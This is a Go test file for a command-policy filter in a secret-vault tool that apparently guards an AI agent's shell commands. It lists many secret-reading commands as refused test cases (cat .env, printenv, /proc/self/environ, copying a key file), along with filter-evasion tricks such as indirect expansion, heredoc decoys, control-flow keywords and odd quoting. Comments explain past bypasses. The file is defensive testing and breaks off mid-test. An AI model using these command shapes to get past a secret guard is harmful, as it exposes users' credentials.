package policy

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Elixion-ai/claudepass/internal/vault"
)

var bound = []Var{{"STRIPE_LIVE", vault.BindEnv}, {"GCP_SA", vault.BindFile}}

func TestEvaluate(t *testing.T) {
	cases := []struct {
		name    string
		argv    []string
		refused bool
	}{
		// allowed
		{"plain command", []string{"ls", "-la"}, false},
		{"echo literal", []string{"echo", "hello"}, false},
		{"echo unbound var in shell", []string{"sh", "-c", "echo $HOME"}, false},
		{"use in header", []string{"sh", "-c", `curl -H "Authorization: Bearer $STRIPE_LIVE" https://x`}, false},
		{"test -n", []string{"sh", "-c", `test -n "$STRIPE_LIVE" && echo ok`}, false},
		{"env with command", []string{"env", "FOO=1", "true"}, false},
		{"env -i cmd", []string{"env", "-i", "PATH=/bin", "true"}, false},
		{"set -e", []string{"bash", "-c", "set -e; true"}, false},
		{"export assignment", []string{"sh", "-c", "export FOO=bar; true"}, false},
		{"file used by tool", []string{"sh", "-c", `gcloud auth activate-service-account --key-file="$GCP_SA"`}, false},
		{"wc on file via redirect", []string{"sh", "-c", `wc -c < "$GCP_SA"`}, false},
		{"test -f file", []string{"sh", "-c", `test -f "$GCP_SA" && echo present`}, false},
		{"cat unrelated file", []string{"cat", "/etc/hosts"}, false},
		{"grep unrelated", []string{"sh", "-c", "grep foo bar.txt"}, false},
		{"timeout wrapper ok", []string{"timeout", "5", "true"}, false},
		{"literal dollar in argv is not a shell", []string{"echo", "$STRIPE_LIVE"}, false},
		// refused: secret-bearing file reads (CLA-38 — same rule EvaluateHook applies)
		{"cat dotenv", []string{"cat", ".env"}, true},
		{"cat dotenv via home var literal", []string{"cat", "$HOME/.env"}, true},
		{"less pem file", []string{"less", "server.pem"}, true},
		{"head id_rsa", []string{"head", "id_rsa"}, true},
		{"cat credentials json", []string{"cat", "credentials.json"}, true},
		{"cat dotenv in shell", []string{"sh", "-c", "cat .env"}, true},
		{"source dotenv in shell", []string{"sh", "-c", "source .env"}, true},
		{"dot source dotenv in shell", []string{"sh", "-c", ". .env"}, true},
		{"cat dotenv in nested shell", []string{"sh", "-c", `bash -c "cat .env"`}, true},
		// CLA-61: input redirection, a literal-value variable, and a real
		// backslash-newline continuation are all just as reachable a
		// bypass as a direct `cat .env` and must be refused the same way.
		{"cat dotenv via input redirection", []string{"sh", "-c", "cat < .env"}, true},
		{"cat dotenv via literal-value variable", []string{"sh", "-c", `f=.env; cat "$f"`}, true},
		{"cat dotenv via backslash-newline continuation", []string{"sh", "-c", "ca\\\nt .env"}, true},
		{"source dotenv via literal-value variable", []string{"sh", "-c", `f=.env; source "$f"`}, true},
		// Reopened CLA-61 gap: an unquoted ${f} was tokenized as
		// brace-grouping separators ("cat $" / "f"), so the literal
		// variable was never resolved back to .env for this idiomatic,
		// extremely common spelling — only the quoted "$f" form above was
		// covered.
		{"cat dotenv via unquoted-braces literal variable", []string{"sh", "-c", `f=.env; cat ${f}`}, true},
		// CLA-65: a public key or a template dotenv was never meant to be
		// Vaulted, so these must not be refused with a dead-end "use
		// cpass run instead".
		{"cat id_rsa pub is not a secret", []string{"cat", "id_rsa.pub"}, false},
		{"cat dotenv example is not a secret", []string{"cat", ".env.example"}, false},
		{"cat dotenv sample is not a secret", []string{"cat", ".env.sample"}, false},
		// CLA-66: indirect expansion must be caught up front by Evaluate,
		// the same as the direct $STRIPE_LIVE form.
		{"indirect expansion of a bound variable", []string{"sh", "-c", `x=STRIPE_LIVE; echo "${!x}"`}, true},
		// Reopened CLA-66 gap, same root cause CLA-61 fixed in split.go:
		// the ticket's own literal reproduction is unquoted, and hit the
		// same {/} mis-tokenization bug — only the quoted variant was
		// ever covered, which masked it (Redaction still caught the
		// bound value downstream in the live cpass run path, but this
		// ticket's own acceptance criterion — refused up front by
		// Evaluate — was unmet for the exact command it describes).
		{"indirect expansion of a bound variable, unquoted braces", []string{"sh", "-c", `x=STRIPE_LIVE; echo ${!x}`}, true},
		// refused: raw Secret-shaped literal (CLA-38 — reuses internal/detect)
		{"raw secret literal in argv", []string{"curl", "-H", "Authorization: Bearer sk_live_51H8xJ2eZvKYlo2CTargvVALUEabcdefgh"}, true},
		{"raw secret literal in shell string", []string{"sh", "-c", `curl -H "Authorization: Bearer sk_live_51H8xJ2eZvKYlo2CTshellVALUEabcdefgh"`}, true},
		// refused
		{"printenv", []string{"printenv"}, true},
		{"printenv var", []string{"printenv", "STRIPE_LIVE"}, true},
		{"env bare", []string{"env"}, true},
		{"env -0", []string{"env", "-0"}, true},
		{"/usr/bin/env bare", []string{"/usr/bin/env"}, true},
		{"echo bound in shell", []string{"sh", "-c", "echo $STRIPE_LIVE"}, true},
		{"echo bound braces quoted", []string{"bash", "-c", `echo "${STRIPE_LIVE}"`}, true},
		{"printf bound", []string{"sh", "-c", `printf '%s\n' "$STRIPE_LIVE"`}, true},
		{"after &&", []string{"sh", "-c", "true && echo $STRIPE_LIVE"}, true},
		{"in pipeline", []string{"sh", "-c", "echo $STRIPE_LIVE | base64"}, true},
		{"taint via assignment", []string{"sh", "-c", "X=$STRIPE_LIVE; echo $X"}, true},
		{"taint via export", []string{"sh", "-c", "export X=$STRIPE_LIVE; echo $X"}, true},
		{"nested shell", []string{"sh", "-c", `bash -c 'echo $STRIPE_LIVE'`}, true},
		{"eval", []string{"sh", "-c", `eval "echo \$STRIPE_LIVE"`}, true},
		{"command substitution", []string{"sh", "-c", "true $(printenv STRIPE_LIVE)"}, true},
		{"backtick substitution", []string{"sh", "-c", "x=`echo $STRIPE_LIVE`; true"}, true},
		{"env inside shell", []string{"sh", "-c", "env | grep STRIPE"}, true},
		{"set bare", []string{"sh", "-c", "set"}, true},
		{"set -x", []string{"sh", "-c", "set -x; true"}, true},
		{"sh -xc", []string{"sh", "-xc", "true"}, true},
		{"export bare", []string{"sh", "-c", "export"}, true},
		{"export -p", []string{"bash", "-c", "export -p"}, true},
		{"declare -p", []string{"bash", "-c", "declare -p"}, true},
		{"compgen -v", []string{"bash", "-c", "compgen -v"}, true},
		{"proc self environ", []string{"cat", "/proc/self/environ"}, true},
		{"proc pid environ in shell", []string{"sh", "-c", "tr '\\0' '\\n' < /proc/$$/environ"}, true},
		{"strings proc environ", []string{"strings", "/proc/1234/environ"}, true},
		{"cat file binding", []string{"sh", "-c", `cat "$GCP_SA"`}, true},
		{"base64 file binding", []string{"sh", "-c", `base64 $GCP_SA`}, true},
		{"cp file binding", []string{"sh", "-c", `cp "$GCP_SA" /tmp/out`}, true},
		{"grep dot file binding", []string{"sh", "-c", `grep . $GCP_SA`}, true},
		{"nohup wrapper", []string{"nohup", "printenv"}, true},
		{"env wrapper to printenv", []string{"env", "FOO=1", "printenv"}, true},
		// command-policy:reader-here-string-reveal-bypass (round 2 review):
		// a reader given no real file operand but a bound Secret's value
		// via a here-string is functionally "cat used as echo" and must be
		// refused the same way a printer given $STRIPE_LIVE already is.
		{"cat here-string reveals bound env var", []string{"sh", "-c", "cat <<< $STRIPE_LIVE"}, true},
		{"tail here-string reveals bound env var", []string{"sh", "-c", "tail <<< $STRIPE_LIVE"}, true},
		{"head here-string reveals bound env var", []string{"sh", "-c", "head <<< $STRIPE_LIVE"}, true},
		{"less here-string reveals bound env var", []string{"sh", "-c", "less <<< $STRIPE_LIVE"}, true},
		// Paired benign: a here-string with nothing dangerous in it stays
		// allowed.
		{"cat here-string with benign text is allowed", []string{"sh", "-c", "cat <<< hello"}, false},
		// command-policy:evaluate-missing-hook-per-word-wrapper-coverage
		// (round 2 review): a reader behind `find -exec`, unrecognized by
		// both the `wrappers` map and the `shells` map, must still be
		// caught — as both a direct argv (no shell) and a shell-string
		// invocation.
		{"find -exec cat dotenv, direct argv", []string{"find", ".", "-exec", "cat", ".env", ";"}, true},
		{"find -exec cat dotenv, shell string", []string{"sh", "-c", `find . -exec cat .env \;`}, true},
		// Paired benign: find with nothing dangerous behind -exec stays
		// allowed, both as direct argv and as a shell string.
		{"find -exec echo hello, direct argv is allowed", []string{"find", ".", "-exec", "echo", "hello", ";"}, false},
		{"find -exec cat unrelated file, shell string is allowed", []string{"sh", "-c", `find . -exec cat /etc/hosts \;`}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: c.argv, Bound: bound})
			if (err != nil) != c.refused {
				t.Fatalf("argv %q: refused=%v want %v (err=%v)", c.argv, err != nil, c.refused, err)
			}
			if err != nil {
				if _, ok := err.(*Refusal); !ok {
					t.Fatalf("want *Refusal, got %T", err)
				}
			}
		})
	}
}

// TestEvaluateDoesNotScanArgv0ForRawLiteral pins CLA-38's raw-literal check
// to arguments only: argv[0] is the program being exec'd, never a value a
// Handle could stand in for, and a real executable path (a build artifact
// under a randomly named temp directory, a versioned tool under a hashed
// store path) routinely reads as high-entropy to the same detector without
// being a Secret — scanning it would make ordinary `cpass run` invocations
// refuse for a reason that has nothing to do with what the command does.
func TestEvaluateDoesNotScanArgv0ForRawLiteral(t *testing.T) {
	argv := []string{"sk_live_51H8xJ2eZvKYlo2CTargvzeroVALUEabc"}
	if err := Evaluate(Input{Argv: argv}); err != nil {
		t.Fatalf("argv[0] must not be scanned for a raw literal: %v", err)
	}
}

func TestProtectedDirs(t *testing.T) {
	in := Input{Bound: bound, ProtectedDirs: []string{"/home/u/.config/claudepass/run"}}
	in.Argv = []string{"cat", "/home/u/.config/claudepass/run/abc/gcp-sa"}
	if Evaluate(in) == nil {
		t.Fatal("literal path under run dir should be refused for a reader")
	}
	in.Argv = []string{"sh", "-c", "head -c 10 /home/u/.config/claudepass/run/abc/gcp-sa"}
	if Evaluate(in) == nil {
		t.Fatal("literal path in shell should be refused")
	}
	// Reopened CLA-61 gap: a run-dir path assigned to a plain variable and
	// referenced with unquoted ${...} braces must resolve back to the
	// literal path the same way the quoted "$VAR" form already does.
	in.Argv = []string{"sh", "-c", "RUNDIR_VAR=/home/u/.config/claudepass/run/abc/gcp-sa; cat ${RUNDIR_VAR}"}
	if Evaluate(in) == nil {
		t.Fatal("literal path via unquoted-braces variable should be refused")
	}
	in.Argv = []string{"gcloud", "--key-file", "/home/u/.config/claudepass/run/abc/gcp-sa"}
	if Evaluate(in) != nil {
		t.Fatal("non-reader may use the path")
	}
	// command-policy:protecteddirs-relative-path-after-cd (round 2 review):
	// a same-command `cd` into the protected run directory followed by a
	// bare relative filename must resolve back to the absolute path
	// underProtected checks against, both for a literal cd target and for
	// one reached through a literal-value variable the same way a
	// file-argument literal already resolves (resolveLiteral).
	in.Argv = []string{"sh", "-c", "cd /home/u/.config/claudepass/run/abc && cat gcp-sa"}
	if Evaluate(in) == nil {
		t.Fatal("relative reference to a live file-Binding after a same-command cd should be refused")
	}
	in.Argv = []string{"sh", "-c", "RUNDIR=/home/u/.config/claudepass/run/abc; cd $RUNDIR && cat gcp-sa"}
	if Evaluate(in) == nil {
		t.Fatal("relative reference after cd via a literal-value variable should be refused")
	}
	// Paired benign: cd-ing somewhere unrelated and reading a relative
	// file there must stay allowed.
	in.Argv = []string{"sh", "-c", "cd /tmp && cat notes.txt"}
	if Evaluate(in) != nil {
		t.Fatal("cd to an unrelated directory must not be refused")
	}
}

// TestProtectedDirsRelativePathAgainstExplicitCwd covers
// command-policy:protecteddirs-relative-path-after-cd's other half: even
// with no `cd` at all, a bare relative reader argument must resolve
// against Input.Cwd — the directory the command will actually run in, as
// the MCP server's run_with_secrets tool supplies it (its own process's
// directory never follows the Agent's, so it cannot rely on os.Getwd()
// alone the way cpass run and EvaluateHook do) — not just against a
// same-command `cd` target.
func TestProtectedDirsRelativePathAgainstExplicitCwd(t *testing.T) {
	in := Input{
		Bound:         bound,
		ProtectedDirs: []string{"/home/u/.config/claudepass/run"},
		Cwd:           "/home/u/.config/claudepass/run/abc",
		Argv:          []string{"cat", "gcp-sa"},
	}
	if Evaluate(in) == nil {
		t.Fatal("a relative reader argument should resolve against the given Cwd and be refused")
	}
	// Paired benign: an unrelated Cwd stays allowed.
	in.Cwd = "/tmp"
	if Evaluate(in) != nil {
		t.Fatal("a relative reader argument under an unrelated Cwd must not be refused")
	}
}

func TestSplitCommands(t *testing.T) {
	cmds := splitCommands(`a "b c" 'd e' f\ g; h | i && j > out 2>&1; k $(l m) n`)
	// CLA-61: a redirection target (here "out") is now captured as a
	// checkable word, same as a bare argument, instead of being dropped.
	want := [][]string{{"a", "b c", "d e", "f g"}, {"h"}, {"i"}, {"j", "out"}, {"k", "$(l m)", "n"}}
	if len(cmds) != len(want) {
		t.Fatalf("got %d commands: %+v", len(cmds), cmds)
	}
	for i := range want {
		if len(cmds[i]) != len(want[i]) {
			t.Fatalf("cmd %d: got %+v want %v", i, cmds[i], want[i])
		}
		for j := range want[i] {
			if cmds[i][j].raw != want[i][j] {
				t.Fatalf("cmd %d word %d: got %q want %q", i, j, cmds[i][j].raw, want[i][j])
			}
		}
	}
	if len(cmds[4][1].subs) != 1 || cmds[4][1].subs[0] != "l m" {
		t.Fatalf("substitution: %+v", cmds[4][1])
	}
}

// TestSplitCommandsUnquotedBraceExpansion is the reopened-CLA-61/CLA-66
// regression: an unquoted ${...} parameter expansion (including ${!x}
// indirect expansion) must tokenize as a single word, not as brace-
// grouping separators around its interior. Before the fix, `cat ${f}`
// mis-split into two simple commands ("cat $" and "f"), so cat never saw
// ${f} as an argument at all and the literal-variable/indirect-expansion
// checks downstream never ran.
func TestSplitCommandsUnquotedBraceExpansion(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want [][]string
	}{
		{"plain parameter expansion", `cat ${f}`, [][]string{{"cat", "${f}"}}},
		{"indirect expansion", `echo ${!x}`, [][]string{{"echo", "${!x}"}}},
		{"quoted form still works (regression guard)", `cat "${f}"`, [][]string{{"cat", "${f}"}}},
		// A bare, unrelated `{`/`}` (not immediately after `$`) is still
		// treated as a command-grouping separator, unchanged.
		{"unrelated bare braces still separate", `{ echo hi; }`, [][]string{{"echo", "hi"}}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			cmds := splitCommands(c.in)
			if len(cmds) != len(c.want) {
				t.Fatalf("got %d commands: %+v", len(cmds), cmds)
			}
			for i := range c.want {
				if len(cmds[i]) != len(c.want[i]) {
					t.Fatalf("cmd %d: got %+v want %v", i, cmds[i], c.want[i])
				}
				for j := range c.want[i] {
					if cmds[i][j].raw != c.want[i][j] {
						t.Fatalf("cmd %d word %d: got %q want %q", i, j, cmds[i][j].raw, c.want[i][j])
					}
				}
			}
		})
	}
}

// TestShellInvocationFlagsBeforeC is CLA-62's acceptance case #2: Docker's
// own SHELL directive shape, a shell option before -c, must still have its
// -c string evaluated rather than allowed unchecked.
func TestShellInvocationFlagsBeforeC(t *testing.T) {
	cases := []struct {
		name string
		argv []string
	}{
		{"single flag before -c", []string{"bash", "-o", "pipefail", "-c", "cat .env"}},
		{"combined short flags before -c", []string{"bash", "-euo", "pipefail", "-c", "cat .env"}},
		{"plus form before -c", []string{"bash", "+o", "pipefail", "-c", "cat .env"}},
		{"long options before -c", []string{"bash", "--noprofile", "--norc", "-c", "cat .env"}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if err := Evaluate(Input{Argv: c.argv}); err == nil {
				t.Fatalf("argv %q: -c's content must still be checked", c.argv)
			}
		})
	}
}

// TestShellInvocationCombinedOptionOrdering is CLA-62's review fix:
// shellCommandString's combined-short-option branch used to return the word
// immediately after wherever 'c' fell in the group as the -c string, the
// instant it saw the letter — but a real shell (verified live against
// /bin/bash) doesn't read the pending command string until the *entire* run
// of option tokens ends, and o/O each claim the next unclaimed word as they
// are encountered, regardless of which side of 'c' they land on. `-co
// pipefail 'cat .env'` therefore checked "pipefail" as if it were the -c
// string — a string with nothing dangerous in it — and the real command,
// `cat .env`, was never evaluated at all: a full, silent bypass reachable
// with either letter order, either sign.
func TestShellInvocationCombinedOptionOrdering(t *testing.T) {
	cases := []struct {
		name    string
		argv    []string
		refused bool
	}{
		{"-co: o before the pipefail value, c deferred to the real command", []string{"bash", "-co", "pipefail", "cat .env"}, true},
		{"-oc: o still first in the group, same result", []string{"bash", "-oc", "pipefail", "cat .env"}, true},
		{"+co: plus form, o-then-c ordering", []string{"bash", "+co", "pipefail", "cat .env"}, true},
		{"+oc: plus form, o-then-c ordering, letters swapped", []string{"bash", "+oc", "pipefail", "cat .env"}, true},
		// Paired benign shapes: the exact same combined-option shapes,
		// pointed at a command with nothing dangerous in it, must stay
		// allowed — this is Command Policy correctly checking the real
		// command, not merely refusing every combined-option group on
		// sight.
		{"-co with a safe command is allowed", []string{"bash", "-co", "pipefail", "echo hello"}, false},
		{"-oc with a safe command is allowed", []string{"bash", "-oc", "pipefail", "echo hello"}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: c.argv})
			if (err != nil) != c.refused {
				t.Fatalf("argv %q: refused=%v want %v (err=%v)", c.argv, err != nil, c.refused, err)
			}
		})
	}
}

// TestShellInvocationUnrecognizedShapeRefuses is CLA-62's fail-closed
// default: a shell-invocation shape shellCommandString cannot resolve to
// concrete content must be refused, never silently allowed.
func TestShellInvocationUnrecognizedShapeRefuses(t *testing.T) {
	cases := []struct {
		name string
		argv []string
	}{
		{"bare shell, nothing to check", []string{"sh"}},
		{"-s, reading real stdin, not statically visible", []string{"sh", "-s"}},
		{"unrecognised long option", []string{"bash", "--rcfile", "x", "-c", "true"}},
		{"-c with no value", []string{"sh", "-c"}},
		{"-o with no value", []string{"bash", "-o"}},
		{"nonexistent script path", []string{"bash", "/does/not/exist/script.sh"}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if err := Evaluate(Input{Argv: c.argv}); err == nil {
				t.Fatalf("argv %q: an unresolvable shell-invocation shape must refuse (fail closed)", c.argv)
			}
		})
	}
}

// TestShellInvocationScriptByPath is CLA-62's acceptance case #1: a bare
// `<shell> script.sh` must have the script's own content statically
// evaluated exactly like an inline -c string — this is what keeps `cpass
// run -- bash script.sh` working for a legitimate script, not just refusing
// every script-by-path invocation outright.
func TestShellInvocationScriptByPath(t *testing.T) {
	dir := t.TempDir()
	dangerous := filepath.Join(dir, "script.sh")
	if err := os.WriteFile(dangerous, []byte("#!/bin/sh\ncat .env\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	safe := filepath.Join(dir, "safe.sh")
	if err := os.WriteFile(safe, []byte("#!/bin/sh\necho hello\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := Evaluate(Input{Argv: []string{"bash", dangerous}}); err == nil {
		t.Fatalf("a script reading .env must be refused: %s", dangerous)
	}
	if err := Evaluate(Input{Argv: []string{"bash", safe}}); err != nil {
		t.Fatalf("a script that does nothing dangerous must still run: %v", err)
	}
	// A script larger than maxStaticScriptSize can't be statically
	// checked, so it must refuse rather than run unchecked.
	big := filepath.Join(dir, "big.sh")
	huge := make([]byte, maxStaticScriptSize+1)
	for i := range huge {
		huge[i] = 'x'
	}
	if err := os.WriteFile(big, huge, 0o600); err != nil {
		t.Fatal(err)
	}
	if err := Evaluate(Input{Argv: []string{"bash", big}}); err == nil {
		t.Fatalf("an oversized script must refuse rather than run unchecked")
	}
}

// TestShellInvocationHeredoc covers CLA-64's third false-positive class
// from the shell-invocation side: a heredoc body attached to a shell must
// still be evaluated (regardless of whether its delimiter is quoted),
// while one attached to any other program is never scanned as commands —
// it is data streamed to that program's stdin.
func TestShellInvocationHeredoc(t *testing.T) {
	cases := []struct {
		name    string
		argv    []string
		refused bool
	}{
		{"quoted delimiter to a shell", []string{"sh", "-c", "sh <<'EOF'\ncat .env\nEOF\n"}, true},
		{"unquoted delimiter to a shell", []string{"sh", "-c", "bash <<EOF\ncat .env\nEOF\n"}, true},
		{"quoted delimiter to a non-shell interpreter", []string{"sh", "-c", "python3 - <<'EOF'\ncat .env\nEOF\n"}, false},
		// CLA-62 review: a -c STRING is what a real shell actually runs
		// even when a heredoc is attached alongside it — the heredoc is
		// just stdin data for that invocation, not a decoy that can hide
		// a dangerous -c string behind a benign-looking body. Before this
		// fix the heredoc was checked first and, when present, evaluated
		// instead of -c's own content, a full silent bypass.
		{"dangerous -c string alongside a benign heredoc is still refused", []string{"sh", "-c", "bash -c \"cat .env\" <<'EOF'\necho decoy\nEOF\n"}, true},
		// The converse also matches real shell semantics: a safe -c
		// string is unaffected by a heredoc that merely looks dangerous,
		// since that heredoc is never executed as commands.
		{"safe -c string alongside a heredoc that merely looks dangerous is allowed", []string{"sh", "-c", "bash -c 'echo hi' <<'EOF'\ncat .env\nEOF\n"}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: c.argv})
			if (err != nil) != c.refused {
				t.Fatalf("argv %v: refused=%v want %v (err=%v)", c.argv, err != nil, c.refused, err)
			}
		})
	}
}

// TestSplitCommandsUnquotedHeredocSubs is CLA-61's review-fix regression at
// the tokenizer level: an UNQUOTED heredoc delimiter's body is expanded by a
// real shell — command substitutions and backticks included — before it
// ever reaches the reading program's stdin, so splitCommands must populate
// the heredoc word's own subs exactly like it already does for a
// double-quoted string. A QUOTED delimiter's body stays genuinely inert:
// no subs, ever, regardless of what its text looks like.
func TestSplitCommandsUnquotedHeredocSubs(t *testing.T) {
	cases := []struct {
		name       string
		in         string
		wantSubs   []string
		wantQuoted bool
	}{
		{"unquoted delimiter, command substitution", "cat <<EOF\n$(cat .env)\nEOF\n", []string{"cat .env"}, false},
		{"unquoted delimiter, backtick substitution", "cat <<EOF\n`cat .env`\nEOF\n", []string{"cat .env"}, false},
		{"unquoted delimiter, no substitution at all", "cat <<EOF\nhello world\nEOF\n", nil, false},
		{"quoted delimiter, would-be substitution stays inert", "cat <<'EOF'\n$(cat .env)\nEOF\n", nil, true},
		{"double-quoted delimiter, would-be substitution stays inert", "cat <<\"EOF\"\n$(cat .env)\nEOF\n", nil, true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			cmds := splitCommands(c.in)
			if len(cmds) != 1 || len(cmds[0]) != 2 {
				t.Fatalf("got %+v", cmds)
			}
			hd := cmds[0][1]
			if !hd.hasHeredoc {
				t.Fatalf("word 1 should be the heredoc body: %+v", hd)
			}
			if hd.heredocQuoted != c.wantQuoted {
				t.Fatalf("heredocQuoted = %v, want %v", hd.heredocQuoted, c.wantQuoted)
			}
			if len(hd.subs) != len(c.wantSubs) {
				t.Fatalf("subs = %+v, want %+v", hd.subs, c.wantSubs)
			}
			for i := range c.wantSubs {
				if hd.subs[i] != c.wantSubs[i] {
					t.Fatalf("subs[%d] = %q, want %q", i, hd.subs[i], c.wantSubs[i])
				}
			}
		})
	}
}

// TestShellInvocationHeredocUnquotedExpansionAnyProgram is CLA-61's
// review-fix regression at the Evaluate level: a real shell expands an
// UNQUOTED heredoc delimiter's body — command substitutions and parameter
// expansions alike — before it ever reaches the reading program's stdin, so
// this must be caught regardless of which program the heredoc is attached
// to, not only a shell (whose own attached heredoc is already fully
// re-parsed as a script by the shells[prog] case, quoted or not). Before
// this fix, splitCommands stored a heredoc's body as opaque text and never
// populated its subs, so a $(...) or backtick buried in an UNQUOTED body was
// invisible to Command Policy for every program except a shell.
func TestShellInvocationHeredocUnquotedExpansionAnyProgram(t *testing.T) {
	cases := []struct {
		name    string
		argv    []string
		bound   []Var
		refused bool
	}{
		{"unquoted heredoc's $(...) reads .env, attached to cat", []string{"sh", "-c", "cat <<EOF\n$(cat .env)\nEOF\n"}, nil, true},
		{"unquoted heredoc's backtick sub reads .env, attached to cat", []string{"sh", "-c", "cat <<EOF\n`cat .env`\nEOF\n"}, nil, true},
		// The same substitution, attached to a program that isn't on the
		// readers list at all — the fix walks every word's subs
		// unconditionally, the same way command substitutions elsewhere
		// in an argument are already evaluated regardless of which
		// program they sit next to.
		{"unquoted heredoc's $(...) reads .env, attached to a non-reader program", []string{"sh", "-c", "wc -l <<EOF\n$(cat .env)\nEOF\n"}, nil, true},
		// Paired benign: the quoted-delimiter counterpart of the exact
		// same body is genuinely inert data in a real shell — .env is
		// never read, the literal text "$(cat .env)" is all that's ever
		// printed.
		{"quoted heredoc's would-be substitution stays inert", []string{"sh", "-c", "cat <<'EOF'\n$(cat .env)\nEOF\n"}, nil, false},
		// A reveal-only bound variable reference in an unquoted heredoc
		// body resolves to the Secret's real value before the reading
		// program (given no file operand) ever starts — exactly like
		// `echo $STRIPE_LIVE`.
		{"unquoted heredoc reveals a bound variable", []string{"sh", "-c", "cat <<EOF\n$STRIPE_LIVE\nEOF\n"}, bound, true},
		// Paired benign: the quoted-delimiter counterpart never expands
		// $STRIPE_LIVE at all — cat just prints the four literal
		// characters, never the Secret's value.
		{"quoted heredoc naming a bound variable as literal text stays inert", []string{"sh", "-c", "cat <<'EOF'\n$STRIPE_LIVE\nEOF\n"}, bound, false},
		// Paired benign: an unquoted heredoc with nothing dangerous in it
		// at all must stay allowed.
		{"unquoted heredoc with benign text is allowed", []string{"sh", "-c", "cat <<EOF\nhello world\nEOF\n"}, nil, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: c.argv, Bound: c.bound})
			if (err != nil) != c.refused {
				t.Fatalf("argv %v: refused=%v want %v (err=%v)", c.argv, err != nil, c.refused, err)
			}
		})
	}
}

// TestShellInvocationScriptByPathWithHeredoc is CLA-62's review fix: a
// script-by-path argument is what a real shell actually runs even when a
// heredoc is attached alongside it, exactly like the -c STRING case in
// TestShellInvocationHeredoc above — the heredoc must not be able to hide
// a dangerous script behind a benign-looking body.
func TestShellInvocationScriptByPathWithHeredoc(t *testing.T) {
	dir := t.TempDir()
	dangerous := filepath.Join(dir, "script.sh")
	if err := os.WriteFile(dangerous, []byte("#!/bin/sh\ncat .env\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	argv := []string{"sh", "-c", "bash " + dangerous + " <<'EOF'\necho decoy\nEOF\n"}
	if err := Evaluate(Input{Argv: argv}); err == nil {
		t.Fatalf("a dangerous script paired with a benign heredoc must still be refused: %v", argv)
	}
}

// TestControlFlowKeywordCommandPosition is
// command-policy:control-flow-keyword-bypass (round 2 review): a shell
// reserved word (if/then/elif/else/fi/while/until/do/done/for/in) is never
// a real program name, so `if cat .env; then true; fi` must still evaluate
// `cat .env` as a real simple command, the same way `sh -c 'cat .env'`
// already does — before this fix splitCommands never recognized these
// words at all, so the whole line tokenized as one bogus simple command
// with prog=="if", and the real `cat .env` invocation was never separately
// checked.
func TestControlFlowKeywordCommandPosition(t *testing.T) {
	cases := []struct {
		name    string
		argv    []string
		refused bool
	}{
		{"if condition reads a secret file", []string{"sh", "-c", "if cat .env; then true; fi"}, true},
		{"while condition reads a secret file", []string{"sh", "-c", "while cat .env; do break; done"}, true},
		{"until condition reads a secret file", []string{"sh", "-c", "until cat .env; do break; done"}, true},
		// The reveal variant: Command Policy's own "refuses ... reveal a
		// Secret" promise, not merely Redaction downstream, must hold for
		// a bound variable printed from inside a control-flow body too.
		{"if body reveals a bound variable", []string{"sh", "-c", "if true; then echo $STRIPE_LIVE; fi"}, true},
		{"while body reveals a bound variable", []string{"sh", "-c", "while true; do echo $STRIPE_LIVE; break; done"}, true},
		// Paired benign shapes: an ordinary if/while/for construct with
		// nothing dangerous in it must stay allowed — this is Command
		// Policy correctly judging the real commands inside, not merely
		// refusing every control-flow construct on sight.
		{"if condition and body are both benign", []string{"sh", "-c", "if true; then echo hello; fi"}, false},
		{"while loop is benign", []string{"sh", "-c", "while false; do echo hello; done"}, false},
		{"for loop over a literal list is benign", []string{"sh", "-c", "for i in 1 2 3; do echo $i; done"}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: c.argv, Bound: bound})
			if (err != nil) != c.refused {
				t.Fatalf("argv %v: refused=%v want %v (err=%v)", c.argv, err != nil, c.refused, err)
			}
		})
	}
}

// TestSplitCommandsControlFlowKeywords is the tokenizer-level regression
// for TestControlFlowKeywordCommandPosition above: a reserved word in
// command-start position is discarded so the following word starts a
// fresh simple command, while the exact same text used as an ordinary
// argument (not a command's own first word) is left alone.
func TestSplitCommandsControlFlowKeywords(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want [][]string
	}{
		{"if/then/fi around a condition and body", "if cat .env; then true; fi",
			[][]string{{"cat", ".env"}, {"true"}}},
		{"while/do/done", "while cat .env; do break; done",
			[][]string{{"cat", ".env"}, {"break"}}},
		{"until/do/done", "until cat .env; do break; done",
			[][]string{{"cat", ".env"}, {"break"}}},
		{"a reserved word used as data (not command-start) is untouched", "echo if then fi",
			[][]string{{"echo", "if", "then", "fi"}}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			cmds := splitCommands(c.in)
			if len(cmds) != len(c.want) {
				t.Fatalf("got %d commands: %+v", len(cmds), cmds)
			}
			for i := range c.want {
				if len(cmds[i]) != len(c.want[i]) {
					t.Fatalf("cmd %d: got %+v want %v", i, cmds[i], c.want[i])
				}
				for j := range c.want[i] {
					if cmds[i][j].raw != c.want[i][j] {
						t.Fatalf("cmd %d word %d: got %q want %q", i, j, cmds[i][j].raw, c.want[i][j])
					}
				}
			}
		})
	}
}

// TestAnsiCAndLocaleQuoting is
// command-policy:quoting-ansi-c-and-locale-strings (round 2 review):
// splitCommands had no case for $'...' (ANSI-C) or $"..." (locale)
// quoting, so both fell through to the default handler, which wrote a
// literal '$' and then parsed '...'/"..." as an ordinary quoted string —
// mangling `cat $'.env'` into the word "$.env", which matches no
// secret-file glob at all.
func TestAnsiCAndLocaleQuoting(t *testing.T) {
	cases := []struct {
		name    string
		argv    []string
		refused bool
	}{
		{"ANSI-C quoting as the sole argument", []string{"sh", "-c", `cat $'.env'`}, true},
